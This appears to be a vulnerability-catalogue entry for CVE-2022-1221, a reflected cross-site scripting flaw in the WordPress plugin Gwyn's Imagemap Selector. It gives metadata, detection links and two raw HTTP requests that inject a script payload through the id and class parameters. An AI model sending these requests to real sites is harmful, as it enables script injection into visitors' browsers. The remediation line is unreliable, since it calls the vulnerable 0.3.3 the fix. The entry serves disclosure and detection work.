---
layout: post
cve_id: CVE-2022-1221
title: WordPress Gwyn's Imagemap Selector <=0.3.3 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1221.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1221.yaml
snort2_rule: N/A
snort3_rule: N/A
author: veshraj
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary script code in the context of the victim''s browser, potentially
  leading to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Update to the latest version of the WordPress Gwyn''s Imagemap Selector
  plugin (0.3.3) or apply the vendor-supplied patch to fix the vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/641be9f6-2f74-4386-b16e-4b9488f0d2a9
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1221
- https://nvd.nist.gov/vuln/detail/CVE-2022-1221
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-1221
  cwe-id: CWE-79
  epss-score: 0.25555
  epss-percentile: 0.96048
  cpe: cpe:2.3:a:gwyn\'s_imagemap_selector_project:gwyn\'s_imagemap_selector:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: gwyn\'s_imagemap_selector_project
  product: gwyn\'s_imagemap_selector
  framework: wordpress
tags:
- cve
- cve2022
- wpscan
- xss
- wordpress
- wp-plugin
- wp
- gwyn\'s_imagemap_selector_project
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Wordpress Gwyn's Imagemap Selector plugin 0.3.3 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize the id and class parameters before returning them back in attributes.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

